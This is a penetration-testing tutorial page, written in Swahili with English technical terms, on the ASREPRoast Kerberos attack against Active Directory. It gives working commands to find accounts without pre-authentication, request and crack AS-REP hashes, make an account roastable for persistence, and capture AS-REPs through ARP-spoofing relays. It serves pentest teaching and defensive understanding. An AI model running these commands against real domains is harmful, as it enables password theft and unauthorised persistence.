# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **Kerberos pre-authentication required attribute**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitishaji kwa mtumiaji kutoka Domain Controller (DC) bila kuhitaji nenosiri la mtumiaji. Kisha DC hujibu kwa ujumbe uliosimbwa kwa kutumia key inayotokana na nenosiri la mtumiaji, ambao washambuliaji wanaweza kujaribu kucrack offline ili kugundua nenosiri la mtumiaji.

Mahitaji makuu ya shambulio hili ni:

- **Ukosefu wa Kerberos pre-authentication**: Watumiaji walengwa lazima wasiwe na kipengele hiki cha usalama kimewashwa.
- **Muunganisho kwa Domain Controller (DC)**: Washambuliaji wanahitaji access kwa DC ili kutuma requests na kupokea ujumbe uliosimbwa.
- **Optional domain account**: Kuwa na domain account huruhusu washambuliaji kutambua kwa ufanisi zaidi watumiaji walio vulnerable kupitia LDAP queries. Bila account kama hiyo, washambuliaji lazima wakisie usernames.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Ombi AS_REP message
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus inaomba **RC4** kwa chaguo-msingi, kwa hiyo Event ID **4768** kawaida huonyesha **preauth type 0** na **ticket encryption type 0x17**. Ukiongeza **`/aes`** (au RC4 imezimwa kwa target), tarajia **AES etypes** badala yake.

#### Quick one-liners (Linux)

- Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Roast whole username list without valid creds using NetExec: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`
- If you do have creds, let NetExec query LDAP and request every roastable account for you: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`
- If the output starts with **`$krb5asrep$23$`**, crack it with Hashcat **`-m 18200`**. If it starts with **`$krb5asrep$17$`** or **`$krb5asrep$18$`**, prefer John **`--format=krb5asrep`**.

### Cracking

Usidhani kila AS-REP roast ni RC4. Tooling za kisasa zinaweza kurudisha **RC4** (`$krb5asrep$23$`) au **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) kulingana na enctype iliyoombwa/iliyokubaliwa. **`hashcat -m 18200`** ni kwa **etype 23**, wakati **John** hushughulikia `krb5asrep` moja kwa moja kwa **17/18/23**.
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

Lazimisha **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika sifa):
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bila credentials

Shambuliaji anaweza kutumia nafasi ya man-in-the-middle kunasa pakiti za AS-REP zinapopita kwenye mtandao bila kutegemea Kerberos pre-authentication kuwa imezimwa. Kwa hiyo, inafanya kazi kwa watumiaji wote kwenye VLAN.\
Ukihitaji mbinu inayohusiana ya no-credential ambayo hurejesha **service ticket** badala ya **TGT** kutoka kwa no-preauth principal, angalia [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) huturuhusu kufanya hivyo. `relay` mode ndiyo ya kuvutia zaidi kwa upande wa offensive kwa sababu inaweza kulazimisha **RC4** wakati client bado inatangaza **etype 23**; `listen` hubaki passive na hunasa tu kile ambacho client/DC wamekubaliana.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
